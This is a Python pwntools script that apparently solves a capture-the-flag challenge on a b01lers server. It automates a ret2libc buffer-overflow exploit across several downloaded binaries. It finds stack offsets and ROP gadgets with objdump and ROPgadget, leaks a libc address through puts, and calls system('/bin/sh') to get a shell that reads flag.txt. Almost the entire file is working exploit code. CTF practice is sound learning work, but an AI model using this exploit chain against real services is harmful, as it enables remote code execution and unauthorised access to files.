#!/usr/bin/python

from pwn import *
import sys
import os

remote_ip, port = 'chal.b01lers.com', 4001
binary = './bin'
brkpts = '''
'''

elf = ELF("bin")
context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
#context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a, drop = True)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))

io = remote(remote_ip, port)
context.noptrace = True

global count

def findLastIndex(str, x):
    index = -1
    for i in range(0, len(str)):
        if str[i] == x:
            index = i
    return index

def recvdata():
    global count
    global binary
    re(2)
    data = reu(": \n")
    idx = findLastIndex(data, "'")
    data = data[:idx].decode("string-escape")
    binary = "bin{}".format(count)
    f = open(binary, "w+")

    count = count + 1
    f.write(data)

def ret2libc():
    elf = ELF(binary)
    cmd = ("objdump -D {} -M intel | grep 'rax,\[rbp-'; objdump -D {} -M intel | grep 'rdi,\[rbp-'".format(binary, binary))
    offset = int(os.popen(cmd).read().split("\n")[0].split("-")[-1].replace("]",""), 16) + 8

    puts = 0x401030
    puts_got = 0x404018
    pop_rdi = int(os.popen("ROPgadget --binary {} | grep 'pop rdi'".format(binary)).read().split(" ")[0], 16)
    log.info("gadget -> "+hex(pop_rdi))

    payload = "a"*offset + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.symbols['main'])
    sl(payload)
    rl()
    rl()
    leak = re(6).strip().ljust(8,"\x00")
    libc  = u64(leak) - 0x875a0
    sys  = libc + 0x55410
    binsh = libc + 0x1b75aa

    log.info("libc @ "+hex(libc))
    log.info("sys @ "+ hex(sys))

    p2 = "a"*offset + p64(pop_rdi) + p64(binsh) + p64(0x000000000040101a) +  p64(sys)
    sla(": \n",p2)

if __name__ == "__main__":
    count = 0
    for i in range(4):
        io.recvline()
    
    for i in range(9):
        recvdata()
        ret2libc()
        while io.can_recv():
            io.recv()
        rl()
        rl()
        sleep(0.5)
        sl("cat flag.txt")
        flag = io.recv()
        sl("exit")
        sla("flag> ", flag)
    
    io.interactive()
    
